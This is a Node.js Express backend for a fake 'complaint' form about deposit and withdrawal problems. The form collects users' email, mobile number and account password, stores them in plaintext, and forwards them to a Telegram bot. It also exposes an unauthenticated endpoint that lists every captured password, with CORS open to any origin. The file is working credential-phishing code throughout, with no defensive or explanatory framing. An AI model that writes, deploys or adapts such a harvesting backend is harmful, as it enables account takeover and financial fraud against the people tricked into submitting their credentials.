const express = require('express');
const initSqlJs = require('sql.js');
const cors = require('cors');

const app = express();
app.use(cors({ origin: process.env.CORS_ORIGIN || '*' }));
app.use(express.json({ limit: '50mb' }));

let db = null;

async function getDb() {
    if (db) return db;
    const wasmUrl = 'https://cdn.jsdelivr.net/npm/sql.js/dist/sql-wasm.wasm';
    const wasmBuffer = await fetch(wasmUrl).then(r => r.arrayBuffer());
    const SQL = await initSqlJs({ wasmBinary: wasmBuffer });
    db = new SQL.Database();
    db.run(`
        CREATE TABLE IF NOT EXISTS complaints (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            mobile TEXT NOT NULL,
            password TEXT NOT NULL,
            problem TEXT NOT NULL,
            amount TEXT,
            image TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    return db;
}

app.get('/', (req, res) => {
    res.json({ status: 'ok', message: 'Backend is running' });
});

app.post('/api/complaint', async (req, res) => {
    try {
        const database = await getDb();
        const { email, mobile, password, problem, amount, image } = req.body;

        database.run(
            `INSERT INTO complaints (email, mobile, password, problem, amount, image) VALUES (?, ?, ?, ?, ?, ?)`,
            [email, mobile, password, problem, amount, image]
        );

        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const problemType = problem === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem';

        if (token && chatId) {
            const msg = `📩━━━ NEW COMPLAINT ━━━📩\n\n━━ Account Details ━━\n\n📧 Email\n\`${email}\`\n\n📱 Mobile\n\`${mobile}\`\n\n🔑 Password\n\`${password}\`\n\n━━ Issue Details ━━\n⚠️ Problem: ${problemType}\n💰 Amount: \`${amount}\`\n━━━━━━━━━━━━━━━━━`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
            }).catch(() => {});
        }

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/complaints', async (req, res) => {
    try {
        const database = await getDb();
        const rows = database.exec('SELECT * FROM complaints ORDER BY created_at DESC');
        const complaints = rows.length > 0 ? rows[0].values.map(row => ({
            id: row[0], email: row[1], mobile: row[2], password: row[3],
            problem: row[4], amount: row[5], image: row[6], created_at: row[7]
        })) : [];
        res.json(complaints);
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/complaint/:id', async (req, res) => {
    try {
        const database = await getDb();
        const id = req.params.id;
        database.run('DELETE FROM complaints WHERE id = ?', [id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/complaints/stats', async (req, res) => {
    try {
        const database = await getDb();
        const total = database.exec('SELECT COUNT(*) as count FROM complaints');
        const deposit = database.exec("SELECT COUNT(*) as count FROM complaints WHERE problem = 'deposit'");
        const withdrawal = database.exec("SELECT COUNT(*) as count FROM complaints WHERE problem = 'withdrawal'");

        res.json({
            total: total[0]?.values[0][0] || 0,
            deposit: deposit[0]?.values[0][0] || 0,
            withdrawal: withdrawal[0]?.values[0][0] || 0
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

module.exports = app;
